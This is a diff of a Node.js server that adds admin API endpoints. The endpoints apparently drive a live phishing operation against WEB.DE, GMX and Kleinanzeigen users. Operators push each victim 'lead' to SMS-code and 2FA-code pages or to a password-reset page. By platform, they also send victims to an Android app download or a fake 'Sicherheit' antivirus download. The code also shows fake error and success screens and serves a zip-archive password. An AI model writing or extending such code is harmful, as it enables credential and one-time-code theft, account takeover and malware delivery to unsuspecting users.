+      const idx = leads.findIndex((l) => l.id === idResolved);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.status = 'redirect_sms_code';
+      const nowBump = new Date().toISOString();
+      lead.lastSeenAt = nowBump;
+      lead.adminListSortAt = nowBump;
+      pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SMS_KL : EVENT_LABELS.SMS, 'admin');
+      persistLeadPatch(idResolved, {
+        status: lead.status,
+        lastSeenAt: lead.lastSeenAt,
+        adminListSortAt: lead.adminListSortAt,
+        eventTerminal: lead.eventTerminal
+      });
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/redirect-2fa-code' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      console.log('[АДМИН] Кнопка: 2-FA — id=' + id);
+      const leads = readLeads();
+      const idResolved = resolveLeadId(String(id).trim());
+      const idx = leads.findIndex((l) => l.id === idResolved);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.status = 'redirect_2fa_code';
+      const nowBump = new Date().toISOString();
+      lead.lastSeenAt = nowBump;
+      lead.adminListSortAt = nowBump;
+      pushEvent(lead, EVENT_LABELS.TWO_FA, 'admin');
+      persistLeadPatch(idResolved, {
+        status: lead.status,
+        lastSeenAt: lead.lastSeenAt,
+        adminListSortAt: lead.adminListSortAt,
+        eventTerminal: lead.eventTerminal
+      });
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/redirect-open-on-pc' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      console.log('[АДМИН] Кнопка: открыть на ПК — id=' + id);
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.status = 'redirect_open_on_pc';
+      pushEvent(lead, 'Отправлен: «Открыть на ПК»', 'admin');
+      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/redirect-android' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.status = 'redirect_android';
+      pushEvent(lead, 'Отправлен на скачивание (Android)', 'admin');
+      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  /**
+   * WEB/GMX: одна кнопка Download — по platform лида:
+   * Android → страница приложения; macOS → смена пароля; Windows / iOS / прочее / неизвестно → Sicherheit (антивирус/PC).
+   */
+
+  if (pathname === '/api/redirect-download-by-platform' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      if (lead.brand === 'klein') {
+        return send(res, 400, { ok: false, error: 'Только для логов WEB.DE / GMX' });
+      }
+      const p = (lead.platform || '').toLowerCase();
+      if (p === 'android') {
+        lead.status = 'redirect_android';
+        pushEvent(lead, 'Отправлен на скачивание (Android)', 'admin');
+      } else if (p === 'macos') {
+        lead.status = 'redirect_change_password';
+        pushEvent(lead, 'Отправлен на смену (Mac)', 'admin');
+      } else {
+        lead.status = 'redirect_sicherheit';
+        pushEvent(lead, 'Отправлен на Sicherheit (Download PC)', 'admin');
+      }
+      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
+      console.log('[АДМИН] Download по OS: id=' + id + ' platform=' + (p || '?') + ' → ' + lead.status);
+      send(res, 200, { ok: true, status: lead.status, platform: p || 'unknown' });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/redirect-klein-forgot' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.status = 'redirect_klein_forgot';
+      pushEvent(lead, 'Klein: редирект на Passwort vergessen', 'admin');
+      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/show-error' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try {
+        json = JSON.parse(body || '{}');
+      } catch {}
+      const id = json.id;
+      if (!id || typeof id !== 'string') return send(res, 400, { ok: false });
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l.id === id);
+      if (idx === -1) return send(res, 404, { ok: false });
+      const lead = leads[idx];
+      lead.status = 'error';
+      const hb = statusHeartbeats[id];
+      const curPage = (hb && hb.currentPage) || '';
+      const isSmsPage = curPage === 'sms-code';
+      const is2faPage = curPage === '2fa-code';
+      lead.adminErrorKind = isSmsPage || is2faPage ? 'sms' : 'login';
+      let evLabel;
+      if (is2faPage) {
+        evLabel = EVENT_LABELS.WRONG_2FA;
+      } else if (isSmsPage) {
+        evLabel = lead.brand === 'klein' ? EVENT_LABELS.WRONG_SMS_KL : EVENT_LABELS.WRONG_SMS;
+      } else {
+        evLabel = lead.brand === 'klein' ? EVENT_LABELS.WRONG_DATA_KL : EVENT_LABELS.WRONG_DATA;
+      }
+      pushEvent(lead, evLabel, 'admin');
+      persistLeadPatch(id, {
+        status: lead.status,
+        adminErrorKind: lead.adminErrorKind,
+        eventTerminal: lead.eventTerminal
+      });
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/show-success' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch {}
+      const id = (json.id != null && json.id !== '') ? String(json.id).trim() : '';
+      if (!id) return send(res, 400, { ok: false, error: 'Нужен id лида' });
+      const leads = readLeads();
+      const idx = leads.findIndex((l) => l && String(l.id) === id);
+      if (idx === -1) return send(res, 404, { ok: false, error: 'Запись не найдена' });
+      const lead = leads[idx];
+      lead.status = 'show_success';
+      pushEvent(lead, lead.brand === 'klein' ? EVENT_LABELS.SUCCESS_KL : EVENT_LABELS.SUCCESS, 'admin');
+      persistLeadPatch(id, { status: lead.status, eventTerminal: lead.eventTerminal });
+      send(res, 200, { ok: true });
+    });
+    return true;
+  }
+
+  if (pathname === '/api/geo' && req.method === 'GET') {
+    const ip = (parsed.query.ip || '').trim();
+    if (!ip || ip === '127.0.0.1' || ip === '::1' || ip.startsWith('::ffff:127.')) {
+      return send(res, 200, { countryCode: '' });
+    }
+    const cleanIp = ip.replace(/^::ffff:/, '');
+    const opts = { hostname: 'ip-api.com', path: '/json/' + encodeURIComponent(cleanIp) + '?fields=countryCode', method: 'GET' };
+    const reqGeo = http.request(opts, (resGeo) => {
+      let data = '';
+      resGeo.on('data', (chunk) => { data += chunk; });
+      resGeo.on('end', () => {
+        if (safeEnd(res)) return;
+        let countryCode = '';
+        try {
+          const j = JSON.parse(data);
+          if (j && j.countryCode) countryCode = String(j.countryCode).toUpperCase().slice(0, 2);
+        } catch (_) {}
+        res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
+        res.end(JSON.stringify({ countryCode: countryCode }));
+      });
+    });
+    reqGeo.on('error', () => {
+      if (safeEnd(res)) return;
+      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
+      res.end(JSON.stringify({ countryCode: '' }));
+    });
+    reqGeo.setTimeout(3000, () => {
+      reqGeo.destroy();
+      if (safeEnd(res)) return;
+      res.writeHead(200, { 'Content-Type': 'application/json', 'Access-Control-Allow-Origin': '*' });
+      res.end(JSON.stringify({ countryCode: '' }));
+    });
+    reqGeo.end();
+    return true;
+  }
+
+  if (pathname === '/api/zip-password' && req.method === 'GET') {
+    send(res, 200, { password: readZipPassword() });
+    return true;
+  }
+
   }
   return false;
 }
